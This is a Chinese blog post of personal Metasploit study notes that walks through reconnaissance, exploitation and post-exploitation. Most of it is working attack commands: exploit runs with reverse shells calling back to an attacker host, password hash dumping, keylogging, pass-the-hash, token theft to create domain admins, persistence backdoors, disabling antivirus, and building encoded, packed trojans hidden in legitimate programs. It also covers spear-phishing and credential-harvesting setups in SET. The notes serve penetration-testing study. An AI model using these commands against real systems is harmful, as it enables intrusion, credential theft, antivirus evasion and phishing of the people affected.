---
layout: post
title: "metasploit学习笔记"
description: "msf study note"
categories: [sec]
tags: [msf, security]
---

> N年前使用metasploit框架过程中写下的学习笔记

* Kramdown table of contents
{:toc .toc}

## 一．名词解释

- exploit: 测试者利用它来攻击一个系统，程序，或服务，以获得开发者意料之外的结果。常见的 有内存溢出，网站程序漏洞利用，配置错误exploit。

- payload: 我们想让被攻击系统执行的程序，如reverse shell可以从目标机器与测试者之间建立一 个反响连接，bind shell 绑定一个执行命令的通道至测试者的机器。payload也可以是只 能在目标机器上执行有限命令的程序。

- shellcode: 是进行攻击时的一系列被当作payload的指令，通常在目标机器上执行之后提供一个可 执行命令的shell。

- module: MSF的模块，由一系列代码组成。

- listener: 等待来自被攻击机器的incoming连接的监听在测试者机器上的程序。

## 二．MSF基础

### 启动msf
1、MSF提供多种用户界面：控制台模式（msfconsole），命令行模式（msfcli），图形模式（msfgui、armitage），（在老版本中还有web界面模式，后来貌似由于安全因素被取消了？）其中console模式最常用，启动方式：
```
cd /opt/framework/msf3/
msfconsole
```

运行此命令后将进入msf命令提示符：
```
msf>
```

### 获取帮助信息
2、获取命令的帮助信息：help

例子：
```
help connect
```

### msfcli
3、msfcli 和msfconsole相比不提供交互方式，它直接从命令行输入所有参数并产生结果，

msfcli –h #获取帮助信息

msfcli <exploit_name> <option=value> [mode]

```
mode:H（help）帮助

   S（summary）显示模块信息

    O（options）显示模块的可用选项

     A（advanced）显示高级选项   

I（ids）显示IDS EVASION 选项

     P（payload）显示此模块可用的payload

T（targets）显示可用targets

AC（action）显示可用actions

C（check）运行模块测试

   E（execute）执行选定的模块
```

### 模块使用示例
例子：ms08_067_netapi模块

```
msfcli windows/smb/ms08_067_netapi O    #查看可用选项
msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 P #查看可用payload
msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 PAYLOAD=windows/shell/bind_tcp E   #执行 （此处O、P 等参数也可以用小写）
```

### armitage使用
4、Armitage :MSF的一个图形接口

运行方式：

```
cd /opt/farmework/msf3/
armitage
```

### msf其他组件
5、MSF其他组件：

- MSFpayload工具：

用于生成shellcode，可生成C,Ruby，JaveScript，VB格式的shellcode。
帮助信息：

```
msfpayload –h
```
- MSFencode工具：

编码压缩shellcode，过IDS ,防火墙。
```
msfencode -h
msfencode –l 查看可用的编码器（encoders），效果最佳的是x86/shikata_ga_nai
```

## 三．信息刺探与收集

### 1、攻击第一步：基础信息收集

whois查询：

```
msf > whois example.com
msf> whois 192.168.1.100
```

http://searchdns.netcraft.com/在线收集服务器IP信息工具

```
nslookup
set type=mx
> example.com
```

### 2、用nmap探测开放端口和服务：
-sS SYN半开扫描  -sT TCP 半开扫描 -Pn 不使用ping 方式探测主机  -A 探测服务类型 -6 开启IPV6扫描  -O 探测操作系统版本
常用扫描参数组合：

```
nmap –sS –Pn 192.168.0.111
nmap –sS –Pn –A 192.168.0.111 
```

其他组合：

```
nmap -T4 -A -v 深入式扫描
nmap -sS -sU -T4 -A -v 同上，且扫UDP
nmap -p 1-65535 -T4 -A -v  扫描所有TCP端口
nmap -T4 -A -v -Pn 不使用ping
nmap -sn 使用ping
nmap -T4 -F 快速扫描
nmap -sV -T4 -O -F --version-light 加强版快速扫描
nmap -sn --traceroute 快速路由跟踪扫描
nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" 慢速全面扫描
```

（nmap的scripts位于/usr/local/share/nmap/scripts/目录，用LUA语言编写，nmap --script-help all | less 查看脚本扫描帮助信息）
（nmap还有一个GUI界面工具叫zenmap，命令zenmap或nmapfe都可以启动）


### 3、MSF与postgresql协同工作

```
/etc/init.d/postgreql-8.3 start
msf> db_connect postgres:toor@127.0.0.1/msf
msf> db_status
# 导入nmap扫描的结果：
nmap –sS –Pn –A –oX Subnet1 192.168.1.0/24   # -oX 扫描结果导出为Subnet1.xml
msf> db_import Subnet1.xml
msf> db_hosts –c address   #查看导入的主机IP 
```

msf也可以和mysql一起工作，在bt5 r1中msf默认支持连接mysql：

```
msf> db_driver mysql
msf> db_connect root:toor@127.0.0.1/msf3 #连接本机mysql的msf3数据库
mysql默认密码toor，使用db_connect连接时会自动创建msf3库）
```

### 4、高级扫描方式：

```
msf> use auxiliary/scanner/ip/ipidseq   #IPID序列扫描器，与nmap的-sI -O选项类似
show options
set RHOSTS 192.168.1.0/24
set RPORT 8080
set THREADS 50
run
```

（RHOSTS、RPORT等参数也可以用小写）


```
msf> nmap –PN –sI 192.168.1.09 192.168.1.155
```

nmap 连接数据库：

```
msf> db_connect postgres:toor@127.0.0.1/msf
msf> db_nmap –sS –A 192.168.1.111
msf> db_services  #查看扫描结果
```

使用portscan模块：

```
msf> search postscan
msf> use scanner/postscan/syn
set RHOSTS 192.168.1.111
set THREADS 50
run
```

### 5、特定扫描：

smb_version模块：

```
msf> use auxiliary/scanner/smb/smb_version
show options
set RHOSTS 192.168.1.111
run
db_hosts –c address,os_flavor
```

查找mssql主机：

```
msf> use auxiliary/scanner/mssql/mssql_ping
show options
set RHOSTS 192.168.1.0/24
set THREADS 255
run
```

SSH服务器扫描：

```
msf> use auxiliary/scanner/ssh/ssh_version 
set THREADS 50
run
```

FTP主机扫描：

```
msf> use auxiliary/scanner/ftp/ftp_version 
show options
set RHOSTS 192.168.1.0/24
set THREADS 255
run
```

扫描FTP匿名登录：

```
use auxiliary/scanner/ftp/anonymos
set RHOSTS 192.168.1.0/24
set THREADS 50
run
```

扫描SNMP主机：

```
msf> use auxiliary/scanner/snmp/snmp_login
set RHOSTS 192.168.1.0/24
set THREADS 50
run
```

### 6、编写自定义扫描模块：

MSF框架提供对其所有exploit和method的访问，支持代理，SSL，报告生成，线程， 使用Ruby语言。

例子：一个简单的自定义扫描模块

```ruby
#Metasploit
require ‘msf/core’
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::Tcp
include Msf:Auxiliary::Scanner
def initialize
super(
    ‘Name’ => ‘My custom TCP scan’,
    ‘Version’ => ‘$Revision: 1$’,
    ‘Description’ => ‘My quick scanner’,
    ‘Author’ => ‘Your name here’,
    ‘License’ => ‘MSF_LICENSE’
)

register_options(
    [
    Opt::RPORT(12345)
    ],self.class)

end

def run_host(ip)
    connect()
        sock.puts(‘HELLO SERVER’)
        data = sock.recv(1024)
        print_status(“Received: #{data} from #{ip}”)
        disconnect()
    end
end
```


测试：将模块保存到modules/auxiliary/scanner/目录下面,命名为simple_tcp.rb，注意保存的位置很重要。

使用nc监听一个端口测试这个模块：

```
echo “Hello Metasploit” > banner.txt
nc –lvnp 12345 < banner.txt
```

```
msf> use auxiliary/scanner/simple_tcp
>show options
>set RHOSTS 192.168.1.111
>run
[*] Received: Hello Metasploit from 192.168.1.111
```

## 四．基本漏洞扫描

### 1 基本扫描
1、使用nc与目标端口通信，获取目标端口的信息：
```
nc 192.168.1.111 80
GET HTTP 1/1
Server: Microsoft-IIS/5.1
```

  1: 还有一个功能与nc类似的工具Ncat，产自nmap社区，可实现相同功能：

```
ncat -C 192.168.1.111 80
GET / HTTP/1.0
```

  2：题外：ncat还可以做聊天服务器呢！在服务器端监听然后多个客户端直接连上就可以聊天了：服务器（chatserver）：ncatncat -l --chat   其他客户端：ncat chatserver

  3：ncat还可以用来查看各种客户端的请求信息，比如论坛里有人问中国菜刀有木有后门，那么可以这样查看中国菜刀连接后门时发送的数据：
服务器（server.example.com）上：`ncat -l --keep-open 80 --output caidao.log > /dev/null`  然后使用菜刀连接http://server.example.com/nc.php 并请求操作，这是菜刀发送的数据就保存到服务器的caidao.log里面了。也可以导出为hex格式，--output换为--hex-dump就可以了。

  4：其实与nc功能类似的工具在bt5里面还有很多，比如还有一个sbd：

监听：`sbd -l -p 12345`

连接：`sbd 192.168.1.111 12345`

  5：当然也可以用来聊天，与ncat的不同之处在于ncat自动对用户编号user1、user2、...，而sbd可以自定义昵称，且不需要专门单独监听为聊天服务器：

pc1：`sbd -l -p 12345 -P chowner`

pc2：`sbd pc1 12345 -P evil`

  6：其实nc也可以用来聊天的：

pc1：`nc -l -p 12345`

pc2: `telnet pc1 12345`

### 2 与NeXpose结合扫描：

在nexpose中扫描目标并生成xml格式的报告后，将报告导入到msf：

```
db_connect postgres:toor@127.0.0.1/msf
db_import /tmp/host_test.xml
db_hosts –c address,svvs,vulns
db_vulns
```

在MSF中运行nexpose：

```
db_destroy postgres:toor@127.0.0.l1/msf
db_connect postgres:toor@127.0.0.1/msf
load nexpose
nexpose_connect –h
nexpose_connect nexpose:toor@192.168.1.111 ok
nexpose_scan 192.168.1.195
db_hosts –c address
db_vulns
```

（如果你想在bt5里安装nexpose的话建议把bt5硬盘空间多留几十G，这玩意硬盘小了不让装。）

### 3、与nessus结合扫描：

使用Nessus扫描完成后生成.nessus格式的报告，导入到MSF：

```
db_connect postgres:toor@127.0.0.1/msf
db_import /tmp/nessus_report_Host_test.nessus
db_hosts –c address,svcs,vulns
db_vulns
```

在MSF中使用Nessus：

```
db_connect postgres:toor@127.0.0.1/msf
load nessus
nessus_connect nessus:toor@192.168.1.111:8834 ok
nessus_policy_list  #查看存在的扫描规则
nessus_scan_new 2 bridge_scan 192.168.1.111 #2表示规则的ID号，bridge_scan自定义扫描名称
nessus_scan_status #查看扫描进行状态
nessus_report_list  #查看扫描结果
nessus_report_get skjla243-3b5d-*******   #导入报告
db_hosts –c address,svcs,vulns
```

### 4、特殊扫描：

SMB弱口令:

```
msf> use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.111-222
set SMBUser Administrator
set SMBPass admin
run
```

VNC空口令：

```
msf> use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS 192.168.1.111
run
```

Open X11空口令：

```
msf> use auxiliary/scanner/x11/open_x11
set RHOST 192.168.1.0/24
set THREADS 50
run
```

当扫描到此漏洞的主机后可以使用xspy工具来监视对方的键盘输入：

```
cd /pentest/sniffers/xspy/
./xspy –display 192.168.1.125:0 –delay 100
```

### 5、使用Autopwn处理扫描结果：

autopwn选项：e执行attack   t查看匹配模块   r使用reverse shell作为payload   x基于漏洞筛选模块  p基于端口筛选模块

```
db_connect postgres:toor@127.0.0.1/msf
db_import /root/nessus.nbe
db_autopwn –e –t –r –x –p
```

* -e 针对符合条件的目标加载所有exploit -t显示所有匹配的exploit -r使用反弹shell
* -x 基于漏洞筛选模块 -p基于端口筛选模块

## 五．基础溢出命令

### 1、基本命令：

查看可用溢出模块`show exploits`
查看辅助模块`show auxiliary`  包括扫描器，拒绝服务模块，fuzzer工具或其他。
查看可用选项`show options`

加载模块后退出此模块 back

例子：
```
msf> use windows/smb/ms08_067_netapi
back
```

搜索模块 search

例子： `searh mssql search ms08_067`

查看当前模块可用的payload： `show payloads`

例子：
```
use windows/smb/ms08_067_netapi
show payloads
set payload windows/shell/reverse_tcp
show options
```

查看可选的目标类型`show targets`
查看更多信息`info`
设置一个选项或取消设置 `set/unset`
设置或取消全局选项 `setg/unsetg`  例如设置LHOST就可以用setg，避免后面重复设置
保存全局选项的设置 `save`   当下次启动仍然生效
查看建立的session  `sessions –l`

激活session   `sessions –i  num`    #num为session编号


### 2、暴力端口探测：

当主机端口对外开放但是普通探测方法无法探测到时，用此模块，msf将对目标的所有端口进行尝试，直到找到一个开放端口并与测试者建立连接。

例子：

```
use exploit/windows/smb/ms08_067_netapi
set LHOST 192.168.1.111
set RHOST 192.168.1.122
set TARGET 39 #Windows XP SP3 Chinese - Simplified (NX)
search ports   #搜索与ports相关模块
set PAYLOAD windows/meterpreter/reverse_tcp_allports
exploit –j   #作为后台任务运行
sessions –l –v
sesssions –i 1
```

### 3、MSF脚本文件：

为了缩短测试时间可以将msf命令写入一个文件，然后在msf中加载它。

加载方式：msfconsole的resource命令或者msfconsole加上-r选项

例子：

```
echo ‘version’ > resource.rc
echo ‘load sounds’ >> resource.rc
msfconsole –r resource.rc
```

例子：

```
echo 'use exploit/windows/smb/ms08_067_netapi' > autoexp.rc
echo 'set RHOST 192.168.1.133' >> autoexp.rc
echo 'set PAYLOAD windows/meterpreter/reverse_tcp' >> autoexp.rc
echo 'set LHOST 192.168.1.111' >> autoexp.rc
echo 'exploit' >> autoexp.rc
msfconsole
msf> resource autoexp.rc
```

## 六．METERPRETER

### 1、使用meterpreter

当对目标系统进行溢出时，使用meterpreter作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。
例子：

```
msf> nmap –sT –A –P0 192.168.1.130 #探测开放服务
#假如已经探测到1433（TCP）和1434(UDP)端口（mssql），
msf> nmap –sU 192.168.1.130 –P 1434   #确认端口开放
msf> use auxiliary/scanner/mssql/mssql_ping
show options
set RHOSTS 192.168.1.1/24
set THREADS 20
exploit
```

至此可获取服务器名称，版本号等信息。

```
msf> use auxiliary/scanner/mssql/mssql_login
show options
set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt
set RHOSTS 192.168.1.130
set THREADS 10
set verbose false
exploit
```

暴力猜解登陆密码。接下来使用mssql自带的xp_cmdshell功能添加账户：

```
msf> use exploit/windows/mssql/mssql_payload
show options
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.111
set LPORT 433
set RHOST 192.168.1.130
set PASSWORD password130
exploit
```

当获取到一个meterpreter shell 后可以执行更多的操作：

获取屏幕截图：`screenshot`

获取系统信息：`sysinfo`

获取键盘记录：
```
meterpreter> ps  #查看目标机器进程，假设发现explorer.exe的进程号为1668:
meterpreter> migrate 1668  #插入该进程
meterpreter> run post/windows/capture/keylog_recorder  #运行键盘记录模块，将击键记录保存到本地txt
cat /root/.msf3/loot/*****.txt  #查看结果
```

获取系统账号密码：

```
meterpreter> use priv
meterpreter> run post/windows/gather/hashdump
```

当获取到密码的hash之后无法破解出明文密码且无法直接使用hash登陆，需要使用pass-the-hash技术：

```
msf> use windows/smb/psexec
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.111
set LPORT 443
set RHOST 192.168.1.130
set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29
exploit
```

获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：

在目标机器上执行：`net uaer hacker pass /add`

本地生成一个后门程序：

```
msfpayload windows/meterpreter/reverse_tcp
LHOST=192.168.1.111 LPORT=443 X >payload.exe
```

将payload.exe拷贝到目标机器然后使用新建立的账号执行,本地执行端口监听，等待来自目标机器连接：

```
msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp
LHOST=192.168.1.111 LPORT=443
use priv
getsystem
getuid
```

至此取得SYSTEM权限


### 2、令牌模拟：
当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。

```
meterpreter> ps  # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID为380
meterpreter> steal_token 380
#有时ps命令列出的进程中可能不存在域控账户的进程，此时使用incognito模块查看可用token：
meterpreter> use incognito
meterpreter> list_tokens –u  #列出可用token，假如找到域控token
meterpreter> impersonate_token SNEAKS.IN\\ihazdomainadmin
meterpreter> add_user hacker password –h 192.168.1.50 #在域控主机上添加账户
meterpreter> add_group_user “Domain Admins” hacker –h 192.168.1.50  #将账户添加至域管理员组
```

### 3、内网渗透：
当取得同网段内一台主机的权限后可以进一步渗透网内其他主机：

例子：

```
meterpreter> run get_local_subnets  #查看网段/子网
Local subnet: 192.168.33.0/255.255.255.0
meterpreter> background  #转入后台运行
msf> route add 192.168.33.0 255.255.255.0 1  #本地添加路由信息
msf> route print #查看添加的信息
msf> use linux/samba/lsa_transnames_heap   #准备向内网目标主机进攻
set payload linux/x86/shell/reverse_tcp
set LHOST 10.10.1.129 #此处为attacking主机的外网IP 
set LPORT 8080
set RHOST 192.168.33.132 #内网目标主机
exploit
```

也可以使用自动式添加路由模块：

```
msf> load auto_add_route
msf> exploit
```

### 4、Meterpreter脚本：
使用run scriptname 方式执行

vnc脚本,获取远程机器vnc界面控制

```
meterpreter> run vnc
meterpreter> run screen_unlock
```

进程迁移

当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。

例子：

```
meterpreter> run post/windows/manage/migrate
```

（在64位win7中migrate需要管理员权限执行后门才能成功，而migrate前后获取的权限是有差异的。）

关闭杀毒软件

```
meterpreter> run killav   （这个脚本要小心使用，可能导致目标机器蓝屏死机。）
```

获取系统密码hash

```
meterpreter> run hashdump
```

（64位win7下需要管理员权限执行后门且先getsystem，然后使用

```
run  post/windows/gather/hashdump来dump hash成功率更高。
```
而且如果要使用shell添加系统账户的话win7下得先：

```
run post/windows/escalate/bypassuac  ，不然可能不会成功。）
```

获取系统流量数据

```
meterpreter> run packtrecorder –i 1
```


直捣黄龙

可以干很多事情：获取密码，下载注册表，获取系统信息等

```
meterpreter> run scraper
```

持久保持

当目标机器重启之后仍然可以控制

```
meterpreter> run persistence –X –i 50 –p 443 –r 192.168.1.111
```

-X 开机启动  -i连接超时时间 –p端口 –rIP

下次连接时：

```
msf> use multi/handler
set payload windows/meterpreter/reverse_tcp
set LPOST 443
set LHOST 192.168.1.111
exploit
```

(会在以下位置和注册表以随机文件名写入文件等信息，如：

C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs

C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe

HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP)


POST整合模块

可实现同时多个session操作

例子：获取hash

```
meterpreter> run post/windows/gather/hashdump
```

其他还有很多，使用TAB键补全看下就知道run post/<TAB>


### 5、升级command shell

例子：

```
msfconsole
msf> search ms08_067
msf> use windows/smb/ms08_067_netapi
set PAYLOAD windows/shell/reverse_tcp
set TARGET 3
setg LHOST 192.168.1.111
setg LPORT 8080
exploit –z  #后台运行，如果此处未使用-z参数，后面可以按CTRL-Z转到后台
sessions –u 1  #升级shell，必须前面使用setg设定
sessions –i 2
```

### 6、使用Railgun操作windows APIs 

例子：

```
meterpreter> irb
>>client.railgun.user32.MessageBoxA(o,”hello”,”world”,”MB_OK”)
```

在目标机器上会弹出一个标题栏为world和内容为hello的窗口


## 七．避开杀软

### 1、使用msfpayload创建可执行后门：

例子：

```
msfpayload windows/shell_reverse_tcp 0  #查看选项
msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 X > /var/www/payload1.exe
```

然后本机监听端口

```
msf> use exploit/multi/handler
show options
set PAYLOAD windows/shell_reverse_tcp
set LHOST 192.168.1.111
set LPORT 31337
exploit
```

### 2、过杀软---使用msfencode编码后门：

msfencode –l  #列出可用编码器

例子：

```
msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode –e x86/shikata_ga_nai –t exe > /var/www/payload2.exe
```

使用 R参数作为raw输出至管道，再经过msfencode处理，最后导出。


### 3、多次编码：

例子：

```
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | \
    msfencode –e x86/shikata_ga_nai –c 5 –t raw | \
    msfencode –e x86/alpha_upper –c 2 –t raw | \
    msfencode –e x86/shikata_ga_nai –c 5 –t raw | \
    msfencode –e x86/countdown –c 5 –t exe –o /var/www/payload3.exe
```

简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17次循环编码。

（题外：经测试，1：使用此命令生成的后门也被MSE杀到；2：未编码的后门或编码次数较少的后门可以直接被秒杀；3：windows/x64/meterpreter/reverse_tcp生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了；4：x86编码器编码的后门在64位机器上无法执行；5：360有个沙箱功能，后门文件右键选择“在360隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。）


### 4、自定义可执行程序模板：

msfencode默认使用data/templates/templates.exe（msf v4在templates目录下有针对不同平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如：

```
wget http://download.sysinternals.com/Files/ProcessExplorer.zip
cd work
unzip ProcessExplorer.zip
cd ..
msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x work/procexp.exe –o /var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5
```

在目标机器上运行，然后本地使用msfcli监听端口等待反弹连接：

```
msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 E
```

### 5、暗度陈仓—猥琐执行payload：

绑定payload至一个可执行文件，让目标不知不觉间中招，以putty.exe为例：

```
msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5
```

假如选择一个GUI界面的程序作为绑定目标并且不使用-k选项，则目标执行此程序的时候不会弹出cmd窗口，-k选项的作用是payload独立于模板软件的进程运行。


### 6、加壳：

msfencode部分编码器会增加程序体积，这时可使用壳（packer）来压缩程序，“带套之后 更保险”，例如UPX ：

`apt-get install upx`

最新版可到sf.net下载

使用方法：

`upx -5 /var/www/payload3.exe`


还有另外一个工具msfvenom结合了msfpayload和msfencode的功能，使用起来更省心，亲，一定要试试哦！过杀软总结起来就是多次编码和使用多种壳，终极大法就是使用自己编写的后门（市面上没有，被杀几率更低）。


## 八．使用用户端攻击方式(client-side attacks)


### 1、组合型攻击

主要指利用多种途径包括社会工程学方式攻击目标机器上安装的带有漏洞的程序如浏览 器，pdf阅读器，office软件等，最终获取系统权限。


基于浏览器的攻击：

例子：

```
msf> use windows/browser/ms10_002_aurora
set payload windows/meterpreter/reverse_tcp
set SRVPORT 80
set URIPATH /
set LHOST 192.168.1.111
set LPORT 443
exploit –z
sessions –i 1
run migrate
```

或者:

```
msf> use windows/browser/ms10_002_aurora
show advanced
set ReverseConnectRetries 10
set AutoRunScript migrate –f
exploit
use priv
getsystem
```

### 2、文件格式exploit


利用文件格式的漏洞达到溢出的目的，比如PDF，word，图片等。

例子：

```
msf> use windows/fileformat/ms11_006_createsizeddibsection
info
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.111
set LPORT 443
exploit
```

此时会生成一个msf.doc的word文档，在目标机器上打开此文档，然后本机监听端口等待反弹连接：

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.111
set LPORT 443
exploit –j
```

## 九．MSF 附加模块


包括端口扫描，服务探测，弱口令探测，fuzzer，sql注射等。附加模块没有payload。
模块保存在/opt/framework3/msf3/modules/auxiliary/目录中的各个子目录下。
可用命令查看全部可用附加模块：`msf> show auxiliary`

例子：
o```
msf> use scanner/http/webdav_scanner
info
show options
set RHOSTS 192.168.1.141,192.168.1.142,192.168.2.222
run
```

搜索所有http相关扫描模块：

`search scanner/http`


附加模块深层剖析：

```
cd /opt/framework3/msf3/modules/auxiliary/admin/
wget http://carnal0wnage.googlecode.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursqueare.rb
```

代码分析:

```ruby
require ‘msf/core’
class Metasploit3 < Msf::Auxiliary #导入Auxiliaary类
#Exploit mixins should be called first
include Msf::Exploit::Remote::HttpClient #导入HTTPClient方法
include Msf::Auxiliary::Report

def initialize

super(
‘Name’ => ‘Foursquare Location Poster’,
‘Version’ => ‘$Revision:$’,
‘Description’ => ‘F*ck with Foursquare,be anywhere you want to be by venue id’,
‘Author’ => [‘CG’],
‘License’ => MSF_LICENSE,
‘References’ =>
[
[‘URL’,’http://groups.google.com/group/foursquare-api’],
[‘URL’,’http://www.mikekey.com/im-a-foursquare-cheater/’],
]
#todo pass in geocoords instead of venueid,create a venueid, other tom foolery

register_options(
[
Opt::RHOST(‘api.foursquare.com’),
OptString.new(‘VENUEID’,[true,’foursquare venueid’,’185675’]),
OptString.new(‘USERNAME’,[true,’foursquare username’,’username’]),
OptString.new(‘PASSWORD’,[true,’foursquare password’,’password’]),
],self.class)
end

def run
begin
user = datastore[‘USERNAME’]
pass = datasore[‘PASSWORD’]
venid = datastore[‘VENUEID’]
user_pass = Rex::Text.encode_base64(user + “:” + pass)
decode = Rex::Text.decode_base64(user_pass)
postrequest = “twitter=1\n” #add facebook=1 if you want facebook
print_status(“Base64 Encode User/Pass: #{user_pass}”) #debug
print_status(“Base64 Decode User/Pass: #{decode}”)  #debug

res = send_request_cgi({
‘uri’ => “/v1/checkin?vid=#{venid}”,
‘version’ => “1.1”,
‘method’ => ‘POST’,
‘data’ => postrequest,
‘headers’ =>
{
‘Authorization’ => “Basic #{user_pass}”,
‘Proxy-Connection’ => “Keep-Alive”,
}
},25)

print_status(“#{res}”)
end

rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
rescue ::Timeout::Error, ::Errno::EPIPE =>e
pus e.message
end
end
```

ruby白痴一个，代码我也没看懂，不解释了

如何使用：

```
msf> search foursquare
msf> use admin/foursquare
set VENUEID 2584421
set USERNAME msf@elwood.net
set PASSWORD ilovemetasploit
run
```

## 十．社会工程学工具集（SET）

主要功能：hacking the human mind。

### 1、SET基本配置：

SET位于/pentest/exploits/set/目录

更新：

```
cd /pentest/exploits/set/
svn update
```

配置文件config/set_config，当使用基于web的攻击方式时可以将email功能打开：

```
vi config/set_config:
METASPLOIT_PATH=/opt/framework3/msf3
WEBATTACK_EMAIL=ON
```

使用Java applet attack进行攻击的时候默认使用Microsoft作为发布者名称，如果需要自定义则需要安装JDK并打开配置项：

`SELF_SIGNED_APPLET=ON`

SET默认打开AUTO_DETECT项，自动探测本机IP并用于攻击中的各项配置。如果本机是多网卡需要手动指定IP，则需将此项关闭：

`AUTO_DETECT=OFF`

SET默认使用内建的python提供的web server供使用，如需使用apache作为服务则需要本机安装apache并打开配置项：

`APACHE_SERVER=ON`


### 2、网络钓鱼攻击:
Spear-Phishing Attack Vector,利用文件格式漏洞（如PDF）等生成后门并通过email（GMAIL,SENDMAIL,）向目标发送带后门附件的电子邮件，诱使目标打开附件激活后门。

例子：

```
./set
此时选择菜单1.Spear-Phishing Attack Vectors
继续选择：1.Perform a Mass Email Attack
选择exploit：8.Adobe Collab.collectEmailInfo Buffer Overflow
选择payload：4.Windows Reverse TCP Shell
选择是否更改文件名：1.Keep the filename
选择发送邮件方式1.Email Attack Single Email Address
选择邮件模板1.Pre-Defined Template
5.Status Report
输入收件方email地址：webmanager@exmaple.com
选择发件方式：1.Use a GMAIL Account for your email attack
输入发件gmail和密码
选择是否立即监听端口等待连接:yes
```
此时SET会使用刚才的设定全自动监听指定端口。

### 3、WEB方式攻击：

SET可以克隆一个网站并植入后门以此迷惑目标打开此网站并中招。

- Java Applet方式：最成功的方式之一，并不是利用java的漏洞，而是当目标浏览含后门的仿冒站点时会被询问是否允许执行web中的java applet，一旦点击允许则payload开始运行，目标将被重定向到真实的网站。
- 用户端（Client-side）web exploit方式：利用用户端存在的软件漏洞，一般使用0day进行攻击的效果最好。
- 账号密码获取（Username and Password Harvesting）：通过克隆一个目标站并诱使攻击目标登陆，截获其账号密码。例如截获GMAIL密码。
- 标签页绑架（Tabnabbing）：当目标打开多个标签页浏览网站并切换标签页时，网站侦测到目标的行为并显示让目标等待的信息，恰好目标打开了被绑架的标签页并要求在相似程度惊人的网站里输入登陆凭据，当目标输入之后登陆信息即被截获，同时被重定向到真实网站。
- 中间人攻击（Man-Left-in-the-Middle）：此方式使用已经被攻陷的网站的HTTP请求或者网站的XSS漏洞让用户的登陆信息发送至攻击者的HTTP服务器。如果你发现了一个网站的XSS漏洞，可以利用此漏洞构造一个url发送给目标诱使其打开并登陆以截获登陆信息。
- Web Jacking：当目标打开我们的网站时会有一个链接显示为正确的web地址，此时若目标打开此仿冒链接会被定向到我们的仿冒网站，其登陆信息会被截获。
- 混合模式（multi-attack）：可同时使用以上多种攻击手段以提高成功率。
- 介质感染攻击（Infectious Media Generator）：可以让你生成一张光盘或者u盘，里面包含autorun.inf来运行指定的后门文件或者file-format漏洞文件。
- 迷你USB人机接口设备（Teensy USB HID）：当电脑插入USB设备且autorun.inf被禁用时，可使用此方法将USB设备模拟成一个键盘或鼠标设备，进而截获目标机器的击键记录。


### SET其他特殊功能：

包括SET交互式shell，可用来替代meterpreter；远程管理工具（RATTE）；HTTP隧道，当目标主机只开放HTTP端口对外放行时可通过此功能与主机进行通信；WEB-GUI，包含了常用攻击和无线攻击向导，输入./set-web即可运行。

（SET新版本变动较大，请自行摸索。）

## 十一．FAST-TRACK

Fast-Track和SET一样都是python编写的，同样是使用MSF提供的payload以及用户端攻击向导等，作为对MSF的补充，它提供了如MSSQL攻击，更多的exploit，浏览器攻击向导等。fasttrack位于/pentest/exploits/fasttrack/。

交互式模式：`./fast-track.py -i`

命令行模式：`./fast-track.py -c`

Web界面模式：`./fast-track.py -g`


### 1、MSSQL工具：

MSSQL注入漏洞攻击：

攻击时你只需要输入有注入漏洞的url地址，地址里面用INJECTHERE标识可注入字段，如http://example.com/show.asp?id=INJECTHERE&date=2012，fast-track会全自动注入，一旦成功会给你返回一个cmd shell。
注入也支持POST参数，如果是POST的话更加简单，只需要你输入url地址，fast-track会自动判断并尝试进行注入。


SQL暴力破解：另外一个实用的功能是暴力破解器（MSSQL Bruter），可以寻找mssql弱口令，一旦获取到一个sa权限的访问权限，将自动返回一个shell。

SQL注入批量扫描器（SQLPwnage）：此功能可扫描指定网段的所有打开80端口的主机，并扫描是否存在sql注入点，一旦发现注入点将自动尝试攻击并通过xp_cmdshell获取系统权限。


### 2、Binary-HEX 转换器：

当你已经进入一个系统且需要上传可执行文件上去，就可以使用这个工具将可执行的二 进制文件转换为HEX十六进制编码，然后复制粘贴过去即可。

### 3、批量用户端攻击：

